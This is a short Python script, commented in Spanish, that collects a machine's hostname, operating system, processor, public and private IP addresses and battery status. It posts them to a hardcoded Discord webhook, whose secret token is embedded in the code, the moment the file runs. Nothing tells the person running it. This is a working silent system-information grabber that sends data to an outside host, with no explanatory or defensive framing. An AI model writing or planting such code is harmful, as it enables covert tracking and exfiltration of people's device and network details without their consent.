import requests
import socket
import platform
import psutil

# Tu Webhook privado de Discord
WEBHOOK_URL = 'https://discord.com/api/webhooks/1367570346026205204/5RcW61zcwe9Oy8S3BAauNHEahdcCfR2c0Q2fE_c90mLNpZs1w7JTiPP0g04W_65pX7Rt'

def get_private_ip():
    try:
        return socket.gethostbyname(socket.gethostname())
    except:
        return "No disponible"

def get_public_ip():
    try:
        return requests.get('https://api.ipify.org').text
    except:
        return "No disponible"

def get_battery_status():
    try:
        battery = psutil.sensors_battery()
        if battery:
            return f"{battery.percent}% {'(Cargando)' if battery.power_plugged else '(No cargando)'}"
        else:
            return "No disponible"
    except:
        return "Error"

def get_system_info():
    return {
        'Dispositivo': platform.node(),
        'Sistema': platform.system(),
        'Versión': platform.version(),
        'Procesador': platform.processor()
    }

def enviar_reporte():
    info = get_system_info()
    mensaje = (
        f"**[REPORTE DEL DISPOSITIVO]**\n"
        f"**Nombre:** {info['Dispositivo']}\n"
        f"**Sistema Operativo:** {info['Sistema']} {info['Versión']}\n"
        f"**Procesador:** {info['Procesador']}\n"
        f"**IP Pública:** {get_public_ip()}\n"
        f"**IP Privada:** {get_private_ip()}\n"
        f"**Batería:** {get_battery_status()}"
    )

    try:
        requests.post(WEBHOOK_URL, json={"content": mensaje})
    except Exception as e:
        print("Error al enviar el reporte:", e)

# Ejecutar el envío del reporte
enviar_reporte()
